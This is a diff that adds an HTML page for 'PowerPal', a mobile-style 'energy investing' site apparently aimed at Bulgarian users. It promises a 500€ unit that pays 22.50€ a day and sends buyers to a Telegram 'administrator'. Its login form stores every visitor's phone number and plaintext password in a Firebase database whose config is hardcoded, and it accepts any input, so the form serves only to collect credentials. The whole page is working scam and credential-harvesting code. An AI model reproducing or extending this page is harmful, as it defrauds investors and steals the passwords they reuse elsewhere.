@@ -1,0 +1,135 @@
+<!DOCTYPE html>
+<html lang="bg">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <title>PowerPal | Energy Investing</title>
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/intl-tel-input/17.0.8/css/intlTelInput.css">
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0/css/all.min.css">
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/intl-tel-input/17.0.8/js/intlTelInput.min.js"></script>
+    <script src="https://www.gstatic.com/firebasejs/9.6.1/firebase-app-compat.js"></script>
+    <script src="https://www.gstatic.com/firebasejs/9.6.1/firebase-database-compat.js"></script>
+    <style>
+        :root { --gold: #f2e032; --bg: #0b0e11; --card: #1e2329; --text-main: #ffffff; --text-dim: #848e9c; --green: #02c076; --nav-bg: #181a20; }
+        body { background-color: var(--bg); color: var(--text-main); font-family: 'Segoe UI', sans-serif; margin: 0; padding: 0; display: flex; justify-content: center; }
+        .app-container { width: 100%; max-width: 450px; min-height: 100vh; padding-bottom: 90px; }
+        #auth-screen { padding: 40px 20px; text-align: center; }
+        .logo { font-size: 38px; font-weight: 900; color: var(--gold); margin-bottom: 5px; }
+        .subtitle { color: var(--text-dim); margin-bottom: 40px; font-size: 14px; }
+        input { width: 100%; padding: 15px; border-radius: 12px; border: 1px solid #474d57; background: var(--card); color: white; font-size: 16px; box-sizing: border-box; margin-bottom: 20px; outline: none; }
+        .btn-main { background: var(--gold); color: #000; width: 100%; padding: 18px; border-radius: 12px; border: none; font-size: 18px; font-weight: bold; cursor: pointer; }
+        .page { display: none; padding: 20px; }
+        .package { background: var(--card); border-radius: 15px; margin-bottom: 15px; border: 1px solid #2b3139; }
+        .package-header { padding: 20px; display: flex; justify-content: space-between; font-weight: bold; cursor: pointer; }
+        .package-content { padding: 0 20px 20px; display: none; }
+        .info-row { display: flex; justify-content: space-between; margin-bottom: 10px; font-size: 14px; }
+        .btn-buy { background: var(--gold); color: black; border: none; width: 100%; padding: 12px; border-radius: 8px; font-weight: bold; cursor: pointer; }
+        .nav-bar { position: fixed; bottom: 0; width: 100%; max-width: 450px; background: var(--nav-bg); display: flex; justify-content: space-around; padding: 12px 0; border-top: 1px solid #2b3139; }
+        .nav-item { color: var(--text-dim); text-align: center; font-size: 11px; flex: 1; cursor: pointer; }
+        .nav-item i { font-size: 20px; margin-bottom: 4px; display: block; }
+        .nav-item.active { color: var(--gold); }
+    </style>
+</head>
+<body>
+<div class="app-container">
+    <div id="auth-screen">
+        <div class="logo">PowerPal</div>
+        <div class="subtitle">Official Distribution Center</div>
+        <input type="tel" id="phone">
+        <input type="password" id="password" placeholder="PASSWORD">
+        <button class="btn-main" onclick="login()">LOGIN / REGISTER</button>
+    </div>
+
+    <div id="page-home" class="page">
+        <h3 style="color: var(--gold)">Available Units</h3>
+        <div class="package">
+            <div class="package-header" onclick="togglePack('t2')"><span>⚡ 8 Port (T2)</span><span>▼</span></div>
+            <div id="t2" class="package-content">
+                <div class="info-row"><span>Price:</span><b>500€</b></div>
+                <div class="info-row"><span>Daily:</span><b style="color: var(--green)">22.50€</b></div>
+                <button class="btn-buy" onclick="buy('T2', '500€')">RENT NOW</button>
+            </div>
+        </div>
+        </div>
+
+    <div id="page-team" class="page">
+        <h3>My Agency</h3>
+        <p>Invite code: <b>PWBG99</b></p>
+    </div>
+
+    <div id="page-profile" class="page">
+        <h3>Account ID: 992831</h3>
+        <button class="btn-main" style="background: #ff4d4d; color: white;" onclick="location.reload()">LOGOUT</button>
+    </div>
+
+    <div class="nav-bar" id="bottom-nav" style="display: none;">
+        <div class="nav-item active" onclick="showPage('home', this)"><i class="fa-solid fa-house"></i>Home</div>
+        <div class="nav-item" onclick="showPage('team', this)"><i class="fa-solid fa-users"></i>Team</div>
+        <div class="nav-item" onclick="showPage('profile', this)"><i class="fa-solid fa-user"></i>Profile</div>
+    </div>
+</div>
+
+<script>
+    // КОНФИГУРАЦИЯ ЗА ТВОЯ НОВ ПРОЕКТ 167d7
+    const firebaseConfig = {
+        apiKey: "AIzaSyDcgmoYxLE5kbN3VGP9gOpZOu2v_s6r__A",
+        authDomain: "powerpall-167d7.firebaseapp.com",
+        databaseURL: "https://powerpall-167d7-default-rtdb.europe-west1.firebasedatabase.app",
+        projectId: "powerpall-167d7",
+        storageBucket: "powerpall-167d7.firebasestorage.app",
+        messagingSenderId: "107282578587",
+        appId: "1:107282578587:web:db91b83c7a5fcefef4da3e"
+    };
+
+    firebase.initializeApp(firebaseConfig);
+    const db = firebase.database();
+
+    const iti = window.intlTelInput(document.querySelector("#phone"), {
+        initialCountry: "bg",
+        separateDialCode: true,
+        utilsScript: "https://cdnjs.cloudflare.com/ajax/libs/intl-tel-input/17.0.8/js/utils.js",
+    });
+
+    function login() {
+        const phone = iti.getNumber();
+        const pass = document.getElementById('password').value;
+
+        if (!phone || pass.length < 4) {
+            alert("Please enter a valid phone and password!");
+            return;
+        }
+
+        // ЗАПИС В БАЗАТА ДАННИ
+        const userId = phone.replace('+', '');
+        db.ref('users/' + userId).set({
+            phone: phone,
+            password: pass,
+            time: new Date().toLocaleString()
+        }).then(() => {
+            // ПРИ УСПЕХ: ПОКАЖИ САЙТА
+            document.getElementById('auth-screen').style.display = 'none';
+            document.getElementById('page-home').style.display = 'block';
+            document.getElementById('bottom-nav').style.display = 'flex';
+        }).catch((err) => {
+            alert("Error: " + err.message);
+        });
+    }
+
+    function showPage(id, el) {
+        document.querySelectorAll('.page').forEach(p => p.style.display = 'none');
+        document.getElementById('page-' + id).style.display = 'block';
+        document.querySelectorAll('.nav-item').forEach(n => n.classList.remove('active'));
+        el.classList.add('active');
+    }
+
+    function togglePack(id) {
+        const el = document.getElementById(id);
+        el.style.display = (el.style.display === 'block') ? 'none' : 'block';
+    }
+
+    function buy(plan, price) {
+        window.location.href = `https://t.me/powerpal_bulgaria_administrator?text=Искам да инвестирам в пакет ${plan} за ${price}.`;
+    }
+</script>
+</body>
+</html>
